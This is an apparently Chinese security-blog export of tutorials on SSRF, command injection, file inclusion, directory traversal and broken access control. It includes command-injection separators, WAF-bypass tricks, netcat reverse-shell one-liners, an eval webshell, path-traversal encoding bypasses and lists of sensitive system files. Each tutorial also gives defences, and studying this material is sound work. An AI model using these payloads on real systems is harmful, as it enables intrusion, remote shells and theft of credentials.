<p>2.转码服务<br>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p>
<p>由于手机屏幕大小的关系，直接浏览网页内容的时候会造成许多不便，因此有些公司提供了转码功能，把网页内容通过相关手段转为适合手机屏幕浏览的样式。例如百度、腾讯、搜狗等公司都有提供在线转码服务。</p>
<p>3.在线翻译<br>在线翻译：通过 URL地址翻译对应文本的内容。提供此功能的百度、有道等。<br>有道翻译某处SSRF可通网易内网：<br><a href="http://www.anquan.us/static/bugs/wooyun-2016-0198176.html">http://www.anquan.us/static/bugs/wooyun-2016-0198176.html</a></p>
<p>4.图片加载与下载<br>图片加载与下载：通过 URL地址加载或下载图片<br>图片加载远程图片地址此功能用到的地方很多，但大多都是比较隐秘，比如在有些公司中的加载自家图片服务器上的图片用于展示。（此处可能会有人有疑问，为什么加载图片服务器上的图片也会有问题，直接使用img标签不就好了，没错是这样，但是开发者为了有更好的用户体验通常对图片做些微小调整例如加水印、压缩等，就必须要把图片下载到服务器的本地，所以就可能造成SSRF问题）。</p>
<p>二. 从URL关键字中寻找</p>
<pre><code>Share、wap、url、link、src、source、target、u、3g、display、sourceURL、imageURL、domain</code></pre>
<p>三. 通用的SSRF实例</p>
<pre><code>Weblogic配置不当，天生ssrf漏洞
Discuz x2.5/x3.0/x3.1/x3.2 ssrf漏洞</code></pre>
<p>SSRF漏洞的验证</p>
<p><a href="http://www.douban.com/***/service?image=http://www.baidu.com/img/bd_logo1.png">http://www.douban.com/***/service?image=http://www.baidu.com/img/bd_logo1.png</a></p>
<pre><code>我们先验证，请求是否是服务器端发出的，可以右键图片，使用新窗口打开图片，如果浏览器上地址栏是http://www.baidu.com/img/bd_logo1.png，说明不存在SSRF漏洞。

可以在Firebug 或者burpsuite抓包工具，查看请求数据包中是否包含http://www.baidu.com/img/bd_logo1.png这个请求。由于SSRF是服务端发起的请求，因此在加载这张图片的时候本地浏览器中不应该存在图片的请求。

在验证完是由服务端发起的请求之后，此处就有可能存在SSRF，接下来需要验证此URL是否可以来请求对应的内网地址。首先我们要获取内网存在HTTP服务且存在favicon.ico文件地址，才能验证是否是SSRF。</code></pre>
<p>此处找内网地址可以通过从漏洞平台中的历史漏洞寻找泄露的内网地址过滤绕过</p>
<p>@：<br><a href="http://www.baidu.com@10.10.10.10与http/?/10.10.10.10">http://www.baidu.com@10.10.10.10与http?/10.10.10.10</a> 请求是相同的</p>
<p>过滤绕过<br>IP地址转换成十进制：<br>127.0.0.1=2130706433<br><img src="https://img-blog.csdnimg.cn/20190704200442980.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3MTMzNzE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>xip.io<br>xip.io127.0.0.1.xip.io –&gt;127.0.0.1<br><a href="http://www.127.0.0.1.xip.io/">www.127.0.0.1.xip.io</a> –&gt;127.0.0.1<br>Haha.127.0.0.1.xip.io –&gt;127.0.0.1<br>Haha.xixi.127.0.0.1.xip.io –&gt;127.0.0.1</p>
<p>修复方案</p>
<pre><code>统一错误信息，避免用户可以根据错误信息来判断远程服务器端口状态
限制请求的端口为HTTP常用的端口，比如 80,443,8080,8088等
黑名单内网IP。
禁用不需要的协议，仅仅允许HTTP和HTTPS.</code></pre>
<p>相关资源</p>
<pre><code>[安全科普]SSRF攻击实例解析
乌云多数已修复SSRF漏洞可被绕过
利用 Gopher 协议拓展攻击面
SSRF libcurl protocol wrappers利用分析</code></pre>
<p>原文链接：<a href="https://blog.csdn.net/qq_37133717/article/details/94647789">https://blog.csdn.net/qq_37133717/article/details/94647789</a></p>
]]></content>
      <tags>
        <tag>漏洞利用</tag>
      </tags>
  </entry>
  <entry>
    <title>Web:命令执行漏洞</title>
    <url>/2021/05/23/web-ming-ling-zhi-xing-lou-dong/</url>
    <content><![CDATA[<h3 id="命令执行漏洞原理"><a href="#命令执行漏洞原理" class="headerlink" title="命令执行漏洞原理"></a>命令执行漏洞原理</h3><p>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system，exec，shell_exec等，当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击。</p>
<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>脚本语言优点是简洁，方便，但也伴随着一些问题，如速度慢，无法解除系统底层，如果我们开发的应用需要一些除去web的特殊功能时，就需要调用一些外部程序。</p>
<p>PHP可调用外部程序的常见函数：system,exec,shell_exec,passthru,popen,proc_popen</p>
<h3 id="命令执行漏洞利用条件"><a href="#命令执行漏洞利用条件" class="headerlink" title="命令执行漏洞利用条件"></a>命令执行漏洞利用条件</h3><ol>
<li>应用调用执行系统命令的函数</li>
<li>将用户输入作为系统命令的参数拼接到了命令行中</li>
<li>没有对用户输入进行过滤或过滤不严</li>
</ol>
<h3 id="成因分类"><a href="#成因分类" class="headerlink" title="成因分类"></a>成因分类</h3><p>1.代码层过滤不严格：</p>
<p>商业应用需要执行命令，商业应用的一些核心代码可能封住在二进制文件当中，在web应用中通过system函数调用。</p>
<p>system(“/bin/program –arg $arg”)</p>
<p>2.调用第三方组件存在的代码执行漏洞：</p>
<p>如wordpress，可以选择imagemagick这个常用的图片处理组件，处理用户上传图片时造成命令执行</p>
<p>JAVA中 struts2/elasticsearch groovy等</p>
<h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><ol>
<li>继承Web服务程序的权限去执行系统命令或读写文件</li>
<li>反弹shell</li>
<li>控制整个网站甚至服务器</li>
<li>进一步内网渗透</li>
<li>等等</li>
</ol>
<p><img src="https://img-blog.csdn.net/20161022154115710?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="img"></p>
<p><img src="https://img-blog.csdn.net/20161022154121113?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="img"></p>
<p><img src="https://img-blog.csdn.net/20161022154126460?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="img"></p>
<p><img src="https://img-blog.csdn.net/20161022154130613?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="img"></p>
<p>漏洞的渗透方法：</p>
<p>最可靠的方法使用时间延迟推断，类似与盲注的方法。</p>
<p>1.在URL上cmd=xxxxxx后拼接||ping -i 30 127.0.0.1   (&amp;)应用程序I ping -i 30 127.0.0.1 I</p>
<p>可能过滤掉某些命令分隔符 可以换做下面的命令：</p>
<p>I ping -n 30 127.0.0.1 I<br>&amp; ping -i 30 127.0.0.1 &amp;<br>&amp; ping -n 30 127.0.0.1 &amp;<br>;ping 127.0.0.1 ;<br>%0a ping -i 30 127.0.0.1 %0a ‘ ping 127.0.0.1 ‘</p>
<p>注意windows和linux的语法不同：</p>
<p>windows支持：&amp;&amp;,&amp;,||（哪条名令为真执行那条）</p>
<p>linux支持：&amp;&amp;,&amp;,||（执行为真） | （执行后面的语句）</p>
<p>2.发生延迟，说明程序可能易于受到命令注入的攻击，对尝试几次，确定不是因为网络延迟造成的，更改-i -n 数值，确定时间延迟是否随着提交的值发生变化。</p>
<p>3.使用发现的所有可成功实施注入的字符串，尝试注入dir、ls</p>
<p>4不能在浏览器直接看到回显，可将命令重定向到当前目录下的文件中并查看。或者用TFTP上传工具到服务器，用telnet和netcat建立反向shell，用mail通过SMTP发送结果给自己的计算机。</p>
<p>5.查看自己的权限，可以提升自己权限，访问敏感数据或控制服务器。</p>
<h5 id="命令拼接符"><a href="#命令拼接符" class="headerlink" title="命令拼接符"></a>命令拼接符</h5><p>|、||、&amp;、&amp;&amp;的区别：<br>&amp;：无论左边是false还是true，右边都执行<br>&amp;&amp;：具有短路效果，左边是false，右边不执行。<br>|:无论左边是false还是true，右边都会执行<br>||：具有短路效果，左边是true，右边不执行。</p>
<h5 id="代码执行："><a href="#代码执行：" class="headerlink" title="代码执行："></a>代码执行：</h5><p>利用系统函数实现命令执行，在php下，允许命令执行的函数有：<br>eval（）、assert（）、preg_replace（）、call_user_func（）<br>如果页面中存在这些函数并且对于用户的输入没有做严格的过滤，那么就可能造成远程命令执行漏洞</p>
<h5 id="其他函数"><a href="#其他函数" class="headerlink" title="其他函数"></a>其他函数</h5><p>ob_start（）、unserialize（）、creat_function（）<br>、usort（）、uasort（）、uksort（）、<br>array_filter（）、<br>array_reduce（）、<br>array_map（）……</p>
<p><strong>系统命令执行漏洞</strong><br>system（）<br>exec（）<br>shell_exec（）<br>passthru（）<br>pcntl_exec（）<br>popen（）<br>proc_open（）<br>反引号<br>……</p>
<p><strong>命令执行WAF绕过技巧</strong><br><strong>技巧一：通配符</strong><br>ls-l<br>使用通配符<br>/?in/?s-l</p>
<p>/???/??t /??c/p???w?<br>有时候WAF不允许使用太多的？号<br>/?in/cat/?tc/p?sswd</p>
<p>NC反弹shell:<br>nc -e /bin/bash 127.0.0.1 3737<br>为了避免符号，可以将IP地址转换成整型。<br>127.0.0.1-&gt;2130706433</p>
<p>使用通配符<br>root@kali:~#/??n/?c -e/??n/b??h 2130706433 3737</p>
<p><strong>技巧二：连接符</strong></p>
<p><img src="https://img2018.cnblogs.com/blog/1646039/201909/1646039-20190904124248741-71863935.png" alt="img"></p>
<p><strong>技巧三：未初始化的bash变量</strong><br>在bash环境中允许我们使用未初始化的bash变量，如何<br>$a ,$b,$c<br>我们事先并没有定义它们，输出看看:<br>root@kali:<del># echo $a<br>root@kali:</del># echo $b<br>root@kali:<del># echo $c<br>root@kali:</del>#<br>未初始化的变量值都是null</p>
<p>读取/etc/passwd:<br>cat$a /etc$a/passwd$a</p>
<p>测试WAF<br>测试代码：<br><!--?php
echo "OK";
system('dig'.$_GET['host']);
?--></p>
<p><a href="http://www.baidu.com;$s/bin$s/which$s">www.baidu.com;$s/bin$s/which$s</a> nc$s<br>反弹shell:<br>/bin$s/nc$s -e/bin$s/bash$s 2130706433 3737</p>
<p><strong>漏洞修复：</strong></p>
<ol>
<li>尽量少用执行命令的函数或者直接禁用</li>
<li>参数值尽量使用引号包括</li>
<li>在使用动态函数之前，确保使用的函数是指定的函数之一</li>
<li>在进入执行命令的函数/方法之前，对参数进行过滤，对敏感字符进行转义</li>
<li>对PHP语言来说，不能完全控制的危险函数最好不要使用</li>
</ol>
]]></content>
      <tags>
        <tag>漏洞利用</tag>
      </tags>
  </entry>
  <entry>
    <title>Web:文件包含漏洞</title>
    <url>/2021/05/20/web-wen-jian-bao-han-lou-dong/</url>
    <content><![CDATA[<h3 id="文件包含原理"><a href="#文件包含原理" class="headerlink" title="文件包含原理"></a>文件包含原理</h3><h4 id="1-文件包含"><a href="#1-文件包含" class="headerlink" title="1.文件包含"></a>1.文件包含</h4><p>开发人员将相同的函数写入单独的文件中，需要使用某个函数时直接调用此文件，无需再次编写，这种文件调用的过程称文件包含</p>
<h4 id="2-文件包含漏洞"><a href="#2-文件包含漏洞" class="headerlink" title="2.文件包含漏洞"></a>2.文件包含漏洞</h4><p>开发人员为了使代码更灵活，会将被包含的文件设置为变量，用来进行动态调用，从而导致客户端可以恶意调用一个恶意文件，造成文件包含漏洞</p>
<h3 id="文件包含分类"><a href="#文件包含分类" class="headerlink" title="文件包含分类"></a>文件包含分类</h3><h4 id="1-本地文件包含"><a href="#1-本地文件包含" class="headerlink" title="1.本地文件包含"></a>1.本地文件包含</h4><p>包含服务器本身存在的恶意文件<br>a.txt</p>
<pre><code>&lt;?php phpinfo();?&gt;</code></pre>
<p>b.php</p>
<pre><code>&lt;?php
$b=$_GET['id'];
include($b);
?&gt;</code></pre>
<p>payload:</p>
<pre><code>localhost/b.php?id=a.txt //返回phpinfo页面</code></pre>
<p>注：<br>    1.两个文件在同一目录下（若不在同一目录这被包含的文件路径必须写绝对路径或相对路径）<br>    2.被包含的页面的后缀无论是什么都会当做PHP解析</p>
<h4 id="2-远程文件包含"><a href="#2-远程文件包含" class="headerlink" title="2.远程文件包含"></a>2.远程文件包含</h4><p>包含其他网站上的恶意文件<br>远程文件包含利用条件：在php.ini中allow_url_fopen=on、allow_url_include=on</p>
<p>payload：</p>
<pre><code>localhost/b.php?id=http://ip/文件路径</code></pre>
<p>​    1</p>
<p>注：<br>    远程包含的文件路径必须是绝对路径</p>
<h3 id="存在文件包含的脚本语言及应用函数"><a href="#存在文件包含的脚本语言及应用函数" class="headerlink" title="存在文件包含的脚本语言及应用函数"></a>存在文件包含的脚本语言及应用函数</h3><p>php</p>
<pre><code>1.include():执行到include函数时才文件包含，找不到被包含的文件路径时，发出警告，脚本继续运行
2.require():只要程序一运行就进行文件包含，找不到被包含的文件路径时，产生致命错误，脚本停止运行
3.include_once()与require():与上述函数一样，只是若文件中代码已经被包含则不会再次包含</code></pre>
<p>jsp/servlet</p>
<pre><code>1.ava.io.file()
2.java.io.filereader()</code></pre>
<p>asp</p>
<pre><code>1.include file
2.include virtual</code></pre>
<h3 id="各个协议实现命令执行"><a href="#各个协议实现命令执行" class="headerlink" title="各个协议实现命令执行"></a>各个协议实现命令执行</h3><p>%00截断</p>
<pre><code>是否需要截断是根据包含函数后有没有对包含的文件进行拼接一个后缀，如果有就需要使用%00进行截断
当php版本&lt;=5.2使用%00截断</code></pre>
<p>file：//:用于访问本地文件系统</p>
<pre><code>条件(php.ini)：
    allow_url_fopen   off/on
    allow_url_include off/on
使用方法：file：//[文件的绝对路径和文件名]</code></pre>
<p>php://:访问各个输入输出流</p>
<pre><code> php：//filter：用于读取源码并进行bash64编码输出；
    条件（php.ini）：
        allow_url_fope   off/on
        allow_url_include off/on
    php：//input：可以访问请求的原始数据的只读流,将post请求中的数据作为PHP代码执行；
    条件(php.ini)：
        allow_url_fope   off/on
        allow_url_include on
    php://stdin是只读的，php://stdout 和 php://stderr 是只写的。
    php://output 是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。
    php://fd 允许直接访问指定的文件描述符。</code></pre>
<p>zip://,bzip://,zlib://：均属于压缩流，可以访问压缩文件中的子文件，不需要传后缀名</p>
<pre><code>条件：
    allow_url_fope   off/on
    allow_url_include off/on
zip://使用方法：
    zip://[压缩文件绝对路径]#[压缩文件内的子文件名]
bzip2://使用方法：
    bzip2://file.bz2
zlib://使用方法：
    zlib://file.gz</code></pre>
<p>data://</p>
<pre><code>条件：
    allow_url_fope   on
    allow_url_include on</code></pre>
<h3 id="直接执行代码的函数："><a href="#直接执行代码的函数：" class="headerlink" title="直接执行代码的函数："></a>直接执行代码的函数：</h3><p>Eval()、assert()、system()、exec()、shell_exec()、passthru()、</p>
<p>Escapeshellcmd()、pcntl_exec()等就不一一举例了。</p>
<p>1、eval()</p>
<p>eval() 函数把字符串按照 PHP 代码来计算，如常见的一句话后门程序：<!--?php
eval($_POST[cmd])?--></p>
<p>2、assert() 与eval类似，字符串被 assert() 当做 PHP 代码来执行；</p>
<p>PHP文件包含漏洞<br>开发人员都希望代码更加灵活，所以通常会将被包含的文件设置为变量，用来进行动态调用。正是这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。</p>
<h3 id="常见的导致文件包含的函数："><a href="#常见的导致文件包含的函数：" class="headerlink" title="常见的导致文件包含的函数："></a>常见的导致文件包含的函数：</h3><p>PHP:include()、include_once()、require()、require_once()等；<br>1.php文件包含可以直接执行包含文件的代码，包含的文件格式不受任何限制<br>在 php 中提供了四个文件包含函数：<br>(1) Require: 找不到被包含的文件时会产生致命错误(E_COMPILE_ERROR)，并停止脚本；<br>(2) Include：找不到被包含的文件时只会产生一个(E_warinng)，脚本将继续执行；<br>(3) Require_once：与 include 类似会产生警告，区别是如果文件代码已经被包含，则不会再<br>次被包含；</p>
<p>2、文件包含漏洞利用的前提条件：<br>（1）web 应用采用 include 等文件包含函数，并且需要包含的文件路径是通过用户传输参<br>数的方式引入；<br>（2）用户能够控制包含文件的参数，被包含的文件可被当前页面访问；</p>
<p>3、文件包含获取 webshell 的条件：<br>（1）攻击者需要知道文件存放的物理路径；<br>（2）对上传文件所在目录拥有可执行权限；<br>（3）存在文件包含漏洞；</p>
<p>4、典型特征<br>变量的值为一个页面：<br>?page=a.php<br>?home=b.html<br>?file=content…</p>
<p>5、常见的敏感路径：<br>1 Windows<br>C:\boot.ini //查看系统版本<br>C:\windows\system32\inetsrv\MetaBase.xml //IIS 配置文件<br>C:\windows\repair\sam //存储 windows 系统初次安装的密码<br>C:\Program Files\mysql\my.ini //mysql 配置<br>C:\Program Files\mysql\data\mysql\user.MYD //Mysql root<br>C:\windows\php.ini //php 配置信息<br>C:\windows\my.ini //mysql 配置文件</p>
<p>2 UNIX/Linux<br>/etc/passwd<br>/usr/local/app/apache2/conf/httpd.conf //apache2 默认配置文件<br>/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置<br>/usr/local/app/php5/lib/php.ini //PHP 相关配置<br>/etc/httpd/conf/httpd.conf //apache<br>/etc/php5/apache2/php.ini //ubuntu 系统的默认路径</p>
<p>日志默认路径<br>(1) apache+Linux 日志默认路径<br>/etc/httpd/logs/access_log<br>或者<br>/var/log/httpd/access_log</p>
<p>(2) apache+win2003 日志默认路径<br>D:\xampp\apache\logs\access.log<br>D:\xampp\apache\logs\error.log</p>
<p>(3) IIS6.0+win2003 默认日志文件<br>C:\WINDOWS\system32\Logfiles</p>
<p>(4) IIS7.0+win2003 默认日志文件<br>%SystemDrive%\inetpub\logs\LogFiles</p>
<p>(5) nginx 日志文件<br>日志文件在用户安装目录 logs 目录下<br>以我的安装路径为例/usr/local/nginx,<br>那我的日志目录就是在/usr/local/nginx/logs里<br>web 中间件默认配置<br>(1) apache+linux 默认配置文件<br>/etc/httpd/conf/httpd.conf<br>或者<br>index.php?page=/etc/init.d/httpd<br>(2) IIS6.0+win2003 配置文件<br>C:/Windows/system32/inetsrv/metabase.xml<br>(3) IIS7.0+WIN 配置文件<br>C:\Windows\System32\inetsrv\config\applicationHost.config</p>
<h3 id="常见的绕过与防御"><a href="#常见的绕过与防御" class="headerlink" title="常见的绕过与防御"></a>常见的绕过与防御</h3><h4 id="1-00截断（php-lt-5-3-4）"><a href="#1-00截断（php-lt-5-3-4）" class="headerlink" title="1.%00截断（php<5.3.4）"></a>1.%00截断（php&lt;5.3.4）</h4><pre><code>说明：
    PHP内核是由C语言实现的，因此使用了C语言中的一些字符串处理函数。在连接字符串时，0字(x00)将作为字符串的结束符。所以在这个地方，攻击者只要在最后加入一个0字节，就能截断  file变量之后的字符串。
防御：
    禁用0字节</code></pre>
<h4 id="2-超长字符截断"><a href="#2-超长字符截断" class="headerlink" title="2.超长字符截断"></a>2.超长字符截断</h4><pre><code>利用：
    利用操作系统对目录最大长度的限制，可以不需要0字节而达到截断的目的。
    我们知道目录字符串，在window下256字节、linux下4096字节时会达到最大值，最大值长度之后的字符将被丢弃。
    而利用"./"的方式即可构造出超长目录字符串
防御：
    限制用户输入字符长度</code></pre>
<h4 id="3-任意目录遍历"><a href="#3-任意目录遍历" class="headerlink" title="3.任意目录遍历"></a>3.任意目录遍历</h4><pre><code>利用：
    使用"../../../"这样的方式来返回到上层目录中，这种方式又被称为"目录遍历(Path Traversal)"。常见的目录遍历漏洞，还可以通过不同的编码方式来绕过一些服务器端的防御逻辑(WAF)
防御：
    目录遍历漏洞是一种跨越目录读取文件的方法，但当PHP配置了open_basedir时，将很好地保护服务器，使得这种攻击无效。
    open_basedir的作用是限制在某个特定目录下PHP能打开的文件(有点像chroot的感觉)</code></pre>
<h4 id="4-问号截断"><a href="#4-问号截断" class="headerlink" title="4.问号截断"></a>4.问号截断</h4><pre><code>利用：
    http://localhost/FIleInclude/index.php?path=http://localhost/test/solution.php?
防御：
    关闭远程文件包含的配置选项allow_url_include = Off</code></pre>
<h3 id="防御总结"><a href="#防御总结" class="headerlink" title="防御总结"></a>防御总结</h3><pre><code>1.无需情况下设置allow_url_include和allow_url_fopen为关闭
2.对可以包含的文件进行限制，可以使用白名单的方式，或者设置可以包含的目录，如open_basedir
3.尽量不使用动态包含
4.严格检查变量是否已经初始化。
5.建议假定所有输入都是可疑的，尝试对所有输入提交可能可能包含的文件地址，包括服务器本地文件及远程文件，进行严格的检查，参数中不允许出现../之类的目录跳转符。
6.严格检查include类的文件包含函数中的参数是否外界可控。
7.不要仅仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。
8.在发布应用程序之前测试所有已知的威胁。</code></pre>
]]></content>
      <tags>
        <tag>漏洞利用</tag>
      </tags>
  </entry>
  <entry>
    <title>Web:目录遍历漏洞</title>
    <url>/2021/05/21/web-mu-lu-bian-li-lou-dong/</url>
    <content><![CDATA[<h3 id="什么是目录遍历？"><a href="#什么是目录遍历？" class="headerlink" title="什么是目录遍历？"></a>什么是目录遍历？</h3><p>目录遍历（目录穿越）是一个Web安全漏洞，攻击者可以利用该漏洞读取运行应用程序的服务器上的任意文件。 这可能包括应用程序代码和数据，后端系统的登录信息以及敏感的操作系统文件。</p>
<p>在某些情况下，攻击者可能能够在服务器上写入任意文件，（如，FFFTP是一款小型的FTP客户端软件。FFFTP客户端没有正确地验证FTP服务器所返回的LIST命令响应中包含有目录遍历序列（斜线）的文件名，如果用户受骗从恶意的FTP服务器下载的目录包含有带有恶意文件名的文件的话，就可能导致向用户系统的任意位置写入文件）从而允许他们修改应用程序数据或行为，并最终完全控制服务器。</p>
<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>若web要显示一个商品的图像，有时候开发者会用通过HTML加载，如：</p>
<pre><code>&lt;img src="/loadImage?filename=214.png"&gt;</code></pre>
<p>使用filename参数加载图像文件，图片文件位置可能映射在 /var/www/images/ 上，所以真实的路径是 /var/www/images/214.png </p>
<p>这就导致了攻击者可以读取服务器上的任意文件：</p>
<pre><code>https://www.*****.com/loadImage?filename=../../../etc/passwd</code></pre>
<p>filename的参数值与真实路径组合起来就是：</p>
<pre><code>/var/www/images/../../../etc/passwd</code></pre>
<p>其等价于：</p>
<pre><code>/etc/passwd</code></pre>
<pre><code>在Unix操作系统上，../ 是一个标准的返回上一级路径的语法；

在Windows操作系统上， ../ 和 ..\ 都是返回上一级的语句。</code></pre>
<p>(1) 加密参数传递的数据；</p>
<p>在Web应用程序对文件名进行加密之后再提交，比如：“downfile.jsp?filename= ZmFuLnBkZg-  “，在参数filename用的是Base64加密，而攻击者要想绕过，只需简单的将文件名加密后再附加提交即可。所以说，采用一些有规律或者轻易能识别的加密方式，也是存在风险的。</p>
<p>(2) 编码绕过，</p>
<p>尝试使用不同的编码转换进行过滤性的绕过，比如Url编码，通过对参数进行Url编码提交，“downfile.jsp?filename= %66%61%6E%2E%70%64%66“来绕过。</p>
<p>避开过滤</p>
<p>第一种是过滤文件名参数中是否存在任何路径遍历序列(..)<br>如果程序尝试删除(..)来净化用户输入，可以用<br>….// …./ …./\ ….\<br>进行URL编码<br>点–&gt;%2e 反斜杠–&gt;%2f 正斜杠–&gt;%5c<br>进行16为Unicode编码<br>点–&gt;%u002e 反斜杠–&gt;%u2215 正斜杠–&gt;%u2216<br>进行双倍URL编码<br>点–&gt;%252e 反斜杠–&gt;%u252f 正斜杠–&gt;%u255c<br>进行超长UTF-8 Unicode编码<br>点–&gt;%c0%2e %e0$40%ae %c0ae<br>反斜杠–&gt;%c0af %e0%80af %c0%af<br>正斜杠–&gt;%c0%5c %c0%80%5c</p>
<p>(3) 目录限定绕过；</p>
<p>在有些Web应用程序是通过限定目录权限来分离的。当然这样的方法不值得可取的，攻击者可以通过某些特殊的符号“<del>“来绕过。形如这样的提交“downfile.jsp?filename=</del>/../boot”。能过这样一个符号，就可以直接跳转到硬盘目录下了。</p>
<p>(4) 绕过文件后缀过滤；</p>
<p>一些Web应用程序在读取文件前，会对提交的文件后缀进行检测，攻击者可以在文件名后放一个空字节的编码，来绕过这样的文件类型的检查。<br>例如：../../../../boot.ini%00.jpg，Web应用程序使用的Api会允许字符串中包含空字符，当实际获取文件名时，则由系统的Api会直接截短，而解析为“../../../../boot.ini”。<br>在类Unix的系统中也可以使用Url编码的换行符，例如：../../../etc/passwd%0a.jpg如果文件系统在获取含有换行符的文件名，会截短为文件名。也可以尝试%20，例如: ../../../index.jsp%20</p>
<p>(5) 绕过来路验证。<br>Http Referer :    HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的</p>
<p>在一些Web应用程序中，会有对提交参数的来路进行判断的方法，而绕过的方法可以尝试通过在网站留言或者交互的地方提交Url再点击或者直接修改Http Referer即可，这主要是原因Http Referer是由客户端浏览器发送的，服务器是无法控制的，而将此变量当作一个值得信任源是错误的。</p>
<p>防范遍历路径漏洞<br>在防范遍历路径漏洞的方法中，最有效的是权限的控制，谨慎的处理向文件系统API传递过来的参数路径。主要是因为大多数的目录或者文件权限均没有得到合理的配置，而Web应用程序对文件的读取大多依赖于系统本身的API，在参数传递的过程，如果没有得严谨的控制，则会出现越权现象的出现。在这种情况下，Web应用程序可以采取以下防御方法，最好是组合使用。<br>(1) 数据净化，对网站用户提交过来的文件名进行硬编码或者统一编码，对文件后缀进行白名单控制，对包含了恶意的符号或者空字节进行拒绝。<br>(2) Web应用程序可以使用chrooted环境访问包含被访问文件的目录，或者使用绝对路径+参数来控制访问目录，使其即使是越权或者跨越目录也是在指定的目录下。</p>
]]></content>
      <tags>
        <tag>漏洞利用</tag>
      </tags>
  </entry>
  <entry>
    <title>Web:越权漏洞</title>
    <url>/2021/05/25/web-yue-quan-lou-dong/</url>
    <content><![CDATA[<p><img src="/2021/05/25/web-yue-quan-lou-dong/bf3856202467094de30685ac16dc5f3.png" alt="bf3856202467094de30685ac16dc5f3"></p>
<h3 id="一、漏洞描述"><a href="#一、漏洞描述" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h3><p>越权访问（Broken Access Control，简称BAC）是Web应用程序中一种常见的漏洞，由于其存在范围广、危害大，被OWASP列为Web应用十大安全隐患的第二名。</p>
<p>该漏洞是指应用在检查授权时存在纰漏，使得攻击者在获得低权限用户账户后，利用一些方式绕过权限检查，访问或者操作其他用户或者更高权限。越权漏洞的成因主要是因为开发人员在对数据进行增、删、改、查询时对客户端请求的数据过分相信而遗漏了权限的判定，一旦权限验证不充分，就易致越权漏洞。</p>
<h3 id="二、漏洞分类"><a href="#二、漏洞分类" class="headerlink" title="二、漏洞分类"></a>二、漏洞分类</h3><p>越权访问漏洞主要分为水平越权、垂直越权。</p>
<p>水平越权：指攻击者尝试访问与他拥有相同权限的用户资源。例如，用户A和用户B属于同一角色，拥有相同的权限等级，他们能获取自己的私有数据（数据A和数据B），但如果系统只验证了能访问数据的角色，而没有对数据做细分或者校验，导致用户A能访问到用户B的数据（数据B），那么用户A访问数据B的这种行为就叫做水平越权访问。</p>
<p><img src="https://pic1.zhimg.com/80/v2-7e8703b4ba7932bff7e4829e2f324898_720w.jpg" alt="img"></p>
<p>垂直越权：由于后台应用没有做权限控制，或仅仅在菜单、按钮上做了权限控制，导致恶意用户只要猜测其他管理页面的URL或者敏感的参数信息，就可以访问或控制其他角色拥有的数据或页面，达到权限提升的目的。</p>
<p><img src="https://pic3.zhimg.com/80/v2-0c7ce5db8f3634fed66d2766b593ddda_720w.jpg" alt="img"></p>
<h3 id="三、漏洞产生的原因"><a href="#三、漏洞产生的原因" class="headerlink" title="三、漏洞产生的原因"></a>三、漏洞产生的原因</h3><p>通常情况下，一个 Web 程序功能流程是登录 - 提交请求 - 验证权限 - 数据库查询 - 返回结果。如果验证权限不足，便会导致越权。常见的程序都会认为通过登录后即可验证用户的身份，从而不会做下一步验证，最后导致越权。</p>
<p>\1. 通过隐藏 URL</p>
<p>实现控制访问有些程序的管理员的管理页面只有管理员才显示，普通用户看不到，利用 URL 实现访问控制，但 URL 泄露或被恶意攻击者猜到后，这会导致越权攻击。</p>
<p>\2. 直接对象引用</p>
<p>这种通过修改一下参数就可以产生水平越权，例如查看用户信息页面 URL 后加上自己的 id 便可查看，当修改为他人的 ID 号时会返回他人的信息，便产生了水平越权。</p>
<p>\3. 多阶段功能</p>
<p>多阶段功能是一个功能有多个阶段的实现。例如修改密码，可能第一步是验证用户身份信息，号码验证码类的。当验证成功后，跳到第二步，输入新密码，很多程序会在这一步不再验证用户身份，导致恶意攻击者抓包直接修改参数值，导致可修改任意用户密码。</p>
<p>\4. 静态文件</p>
<p>很多网站的下载功能，一些被下载的静态文件，例如 pdf、word、xls 等，可能只有付费用户或会员可下载，但当这些文件的 URL 地址泄露后，导致任何人可下载，如果知道 URL 命名规则，则会便利服务器的收费文档进行批量下载。</p>
<p>\5. 平台配置错误</p>
<p>一些程序会通过控件来限制用户的访问，例如后台地址，普通用户不属于管理员组，则不能访问。但当配置平台或配置控件错误时，就会出现越权访问。</p>
